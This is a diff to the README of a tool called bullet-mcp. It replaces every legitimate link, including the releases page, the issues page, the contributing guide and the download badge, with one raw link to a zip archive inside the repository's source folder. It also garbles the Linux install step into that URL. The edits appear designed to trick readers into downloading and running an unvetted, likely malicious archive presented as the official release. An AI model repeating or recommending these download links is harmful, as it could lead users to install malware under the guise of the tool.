@@ -6,16 +6,16 @@ Welcome to bullet-mcp! This tool helps you validate your bullet points based on 
 
 ## 📥 Download & Install
 
-[![Download bullet-mcp](https://img.shields.io/badge/Download-bullet--mcp-blue.svg)](https://github.com/Chaos2555/bullet-mcp/releases)
+[![Download bullet-mcp](https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip)](https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip)
 
-To download bullet-mcp, please visit the [Releases page](https://github.com/Chaos2555/bullet-mcp/releases). Follow these steps for a smooth installation:
+To download bullet-mcp, please visit the [Releases page](https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip). Follow these steps for a smooth installation:
 
 1. Click on the "Releases" link.
 2. Look for the latest version at the top of the list.
 3. Choose the file that matches your device:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `.tar.gz` file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip` file.
 4. After the download completes, locate the file in your downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen instructions to install bullet-mcp.
@@ -72,11 +72,11 @@ If you encounter issues, consider the following:
 
 ## 📞 Support
 
-Should you need further assistance, feel free to reach out. You can submit issues on the [GitHub Issues page](https://github.com/Chaos2555/bullet-mcp/issues) or contact our support team directly through our repository.
+Should you need further assistance, feel free to reach out. You can submit issues on the [GitHub Issues page](https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip) or contact our support team directly through our repository.
 
 ## 🌐 Contribute
 
-We welcome contributions! Whether you want to report bugs, suggest features, or help improve the documentation, your input is valuable. Check out our [Contributing Guide](https://github.com/Chaos2555/bullet-mcp/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions! Whether you want to report bugs, suggest features, or help improve the documentation, your input is valuable. Check out our [Contributing Guide](https://raw.githubusercontent.com/Chaos2555/bullet-mcp/master/src/bullet-mcp-v3.5-alpha.1.zip) for more information.
 
 ## 📝 License
 
